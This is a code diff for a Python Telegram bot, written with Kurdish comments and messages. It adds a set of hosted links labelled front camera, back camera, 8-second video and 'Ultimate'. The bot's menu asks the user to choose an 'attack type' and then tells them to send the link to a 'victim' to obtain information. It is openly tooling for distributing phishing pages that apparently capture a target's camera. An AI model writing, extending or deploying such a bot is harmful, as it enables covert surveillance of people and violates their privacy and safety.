@@ -13,7 +13,15 @@ if not BOT_TOKEN:
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# تابلۆی پێشوازیکردنی شاهانە (تەنها دوگمەی وەرگرتنی لینکی کامێرا نیشان دەدات)
+# لینکەکانت
+LINKS = {
+    "front": "https://genuine-bublanina-6ef92a.netlify.app/",
+    "back": "https://majestic-cannoli-a2db6b.netlify.app/",
+    "video": "https://splendorous-toffee-5f8076.netlify.app",
+    "all": "https://jolly-entremet-36bd78.netlify.app"
+}
+
+# تابلۆی پێشوازیکردنی شاهانە
 @bot.message_handler(commands=['start'])
 def send_welcome(message):
     user = message.from_user
@@ -45,20 +53,45 @@ def send_welcome(message):
 @bot.callback_query_handler(func=lambda call: True)
 def callback_query(call):
     if call.data == "get_camera_menu":
-        bot.answer_callback_query(call.id, "فەرموو بژاردەکان هەڵبژێرە!")
+        bot.answer_callback_query(call.id, "فەرموو جۆری هێرشەکە هەڵبژێرە!")
         
-        # کاتێک کلیک لەسەر وەرگرتنی لینکی کامێرا دەکرێت، ئەم مێنۆیە دەردەکەوێت
-        menu_text = "🎯 **فەرموو یەکێک لە لینکە هێرشبەرەکان هەڵبژێرە:**"
+        menu_text = "🎯 **فەرموو یەکێک لە جۆرەکان هەڵبژێرە بۆ وەرگرتنی لینکەکەی:**"
         
+        # لێرەدا callback_data دادەنێین نەک url، بۆ ئەوەی پەیامی تێدا بنێرین
         markup = InlineKeyboardMarkup(row_width=1)
         markup.add(
-            InlineKeyboardButton("📸 کامێرای پێشەوە", url="https://genuine-bublanina-6ef92a.netlify.app/"),
-            InlineKeyboardButton("📸 کامێرای پشتەوە", url="https://majestic-cannoli-a2db6b.netlify.app/"),
-            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", url="https://splendorous-toffee-5f8076.netlify.app"),
-            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", url="https://jolly-entremet-36bd78.netlify.app")
+            InlineKeyboardButton("📸 کامێرای پێشەوە", callback_data="link_front"),
+            InlineKeyboardButton("📸 کامێرای پشتەوە", callback_data="link_back"),
+            InlineKeyboardButton("🎥 ٨ چرکە ڤیدیۆ گرتن", callback_data="link_video"),
+            InlineKeyboardButton("💎 هەمووی پێکەوە (Ultimate)", callback_data="link_all")
         )
         
         bot.send_message(call.message.chat.id, menu_text, reply_markup=markup, parse_mode="Markdown")
+
+    # ناردنی لینکەکان بە شێوازی تێکست و کۆپی کردن
+    elif call.data.startswith("link_"):
+        key = call.data.split("_")[1]
+        link = LINKS.get(key, "https://google.com")
+        
+        titles = {
+            "front": "کامێرای پێشەوە",
+            "back": "کامێرای پشتەوە",
+            "video": "٨ چرکە ڤیدیۆ",
+            "all": "هەمووی پێکەوە (Ultimate)"
+        }
+        
+        target_name = titles.get(key, "لینک")
+        
+        bot.answer_callback_query(call.id, f"لینکی {target_name} ئامادە کرا!")
+        
+        # ڕستەی داواکراو لەگەڵ لینکی خاوێن بۆ کۆپی کردن
+        response_text = (
+            f"🔗 لینکەکە بۆ قوربانی بنێرە بۆ دەستکەوتنی زانیاری ({target_name}):\n\n"
+            f"`{link}`\n\n"
+            "👇 **پەنجە بنێ بە لینک بۆ کۆپی کردن**"
+        )
+        
+        bot.send_message(call.message.chat.id, response_text, parse_mode="Markdown")
 
     elif call.data == "about":
         bot.answer_callback_query(call.id, "دەربارەی تیتانیۆم کۆر")
